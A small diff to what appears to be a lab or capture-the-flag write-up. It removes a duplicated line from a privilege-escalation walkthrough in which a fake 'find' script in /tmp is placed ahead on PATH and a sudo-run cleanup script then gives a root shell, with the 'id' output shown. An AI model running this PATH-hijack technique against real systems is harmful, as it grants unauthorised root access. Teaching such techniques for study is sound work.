@@ -164,7 +164,6 @@ this is when we manually set the $PATH variable to include a script named "find"
 bash-5.0$ echo bash > /tmp/find
 bash-5.0$ chmod +x /tmp/find
 bash-5.0$  sudo PATH=/tmp:$PATH /opt/cleanup.sh
-sudo PATH=/tmp:$PATH /opt/cleanup.sh
 #  id  
 uid=0(root) gid=0(root) groups=0(root)
 ```
